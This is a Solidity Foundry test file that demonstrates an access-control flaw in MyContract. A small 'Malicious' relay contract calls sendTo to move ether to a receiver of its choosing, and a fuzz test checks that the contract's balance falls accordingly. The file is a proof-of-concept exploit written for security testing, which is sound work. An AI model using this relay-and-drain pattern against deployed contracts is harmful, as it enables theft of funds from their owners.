
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract Malicious {
    MyContract public myContract;

    constructor(MyContract _myContract) {
        myContract = _myContract;
    }

    function attack(address payable receiver, uint amount) public {
        myContract.sendTo(receiver, amount);
    }
}

contract TestAccessControlMyContract is Test {
    MyContract public myContract;
    address public owner;
    uint constant INITIAL_BALANCE = 10 ether;

    function setUp() public {
        owner = makeAddr("owner");
        vm.prank(owner);
        myContract = new MyContract();
        vm.deal(address(myContract), INITIAL_BALANCE);
    }

    function test_highlightArbitraryUserCanAccess(address caller, address payable receiver, uint amount) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != owner);
        vm.assume(receiver != address(0));
        vm.assume(amount > 0);
        vm.assume(amount <= INITIAL_BALANCE);

        // --- 2. State Configuration ---
        

        // --- 3. Execution & Assertion ---
        
        uint receiverBalanceBefore = receiver.balance;
        uint contractBalanceBefore = address(myContract).balance;

        vm.prank(caller);
        Malicious malicious = new Malicious(myContract);

        vm.prank(owner);
        malicious.attack(receiver, amount);

        assertEq(address(myContract).balance, contractBalanceBefore - amount);
        assertEq(receiver.balance, receiverBalanceBefore + amount);
    }
}
